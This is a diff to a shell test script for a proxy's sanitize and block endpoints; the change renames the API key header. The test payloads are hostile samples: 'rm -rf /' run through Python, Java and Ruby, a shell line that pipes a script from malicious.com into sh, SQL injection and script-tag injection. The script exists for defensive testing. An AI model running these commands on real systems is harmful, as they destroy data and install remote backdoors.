@@ -158,7 +158,7 @@ echo -e "\n${GREEN}6. Testing code sanitation with sanitize action...${NC}"
 echo -e "\n${GREEN}6.1 Testing JavaScript injection (should be sanitized)...${NC}"
 RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
     -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
-    -H "X-API-Key: ${API_KEY}" \
+    -H "X-TG-API-Key: ${API_KEY}" \
     -H "Content-Type: application/json" \
     -d '{
         "code": "function malicious() { eval(\"alert(1)\"); }"
@@ -178,7 +178,7 @@ fi
 echo -e "\n${GREEN}6.2 Testing Python injection (should be sanitized)...${NC}"
 RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
     -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
-    -H "X-API-Key: ${API_KEY}" \
+    -H "X-TG-API-Key: ${API_KEY}" \
     -H "Content-Type: application/json" \
     -d '{
         "code": "import os; os.system(\"rm -rf /\")"
@@ -200,7 +200,7 @@ fi
 echo -e "\n${GREEN}6.3 Testing SQL injection (should be sanitized)...${NC}"
 RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
     -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
-    -H "X-API-Key: ${API_KEY}" \
+    -H "X-TG-API-Key: ${API_KEY}" \
     -H "Content-Type: application/json" \
     -d '{
         "query": "SELECT * FROM users WHERE username = \"admin\" OR 1=1"
@@ -219,7 +219,7 @@ fi
 echo -e "\n${GREEN}6.4 Testing Shell injection (should be sanitized)...${NC}"
 RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
     -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
-    -H "X-API-Key: ${API_KEY}" \
+    -H "X-TG-API-Key: ${API_KEY}" \
     -H "Content-Type: application/json" \
     -d '{
         "command": "rm -rf / || curl http://malicious.com/backdoor.sh | sh"
@@ -239,7 +239,7 @@ fi
 echo -e "\n${GREEN}6.5 Testing template injection (should be sanitized)...${NC}"
 RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
     -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
-    -H "X-API-Key: ${API_KEY}" \
+    -H "X-TG-API-Key: ${API_KEY}" \
     -H "Content-Type: application/json" \
     -d '{
         "template": "Hello {{ user.name }}! Your password is {{ user.password }}"
@@ -259,7 +259,7 @@ fi
 echo -e "\n${GREEN}6.6 Testing header injection (should be sanitized)...${NC}"
 RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
     -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
-    -H "X-API-Key: ${API_KEY}" \
+    -H "X-TG-API-Key: ${API_KEY}" \
     -H "Content-Type: application/json" \
     -H "X-Custom-Code: eval(alert(1))" \
     -d '{
@@ -280,7 +280,7 @@ fi
 echo -e "\n${GREEN}6.7 Testing HTML injection (should be sanitized)...${NC}"
 RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
     -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
-    -H "X-API-Key: ${API_KEY}" \
+    -H "X-TG-API-Key: ${API_KEY}" \
     -H "Content-Type: application/json" \
     -d '{
         "content": "<script>alert(1)</script>",
@@ -339,7 +339,7 @@ fi
 # echo -e "\n${GREEN}7.2 Testing JavaScript injection (should be blocked)...${NC}"
 # RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/block-test" \
 #     -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
-#     -H "X-API-Key: ${API_KEY}" \
+#     -H "X-TG-API-Key: ${API_KEY}" \
 #     -H "Content-Type: application/json" \
 #     -d '{
 #         "code": "function malicious() { eval(\"alert(1)\"); }"
@@ -390,7 +390,7 @@ fi
 # echo -e "\n${GREEN}8.2 Testing Java injection with apply_all_languages (should be blocked)...${NC}"
 # RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/all-lang-test" \
 #     -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
-#     -H "X-API-Key: ${API_KEY}" \
+#     -H "X-TG-API-Key: ${API_KEY}" \
 #     -H "Content-Type: application/json" \
 #     -d '{
 #         "code": "Runtime.getRuntime().exec(\"rm -rf /\");"
@@ -413,7 +413,7 @@ fi
 # echo -e "\n${GREEN}8.3 Testing Ruby injection with apply_all_languages (should be blocked)...${NC}"
 # RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/all-lang-test" \
 #     -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
-#     -H "X-API-Key: ${API_KEY}" \
+#     -H "X-TG-API-Key: ${API_KEY}" \
 #     -H "Content-Type: application/json" \
 #     -d '{
 #         "code": "eval(\"puts `rm -rf /`\")"
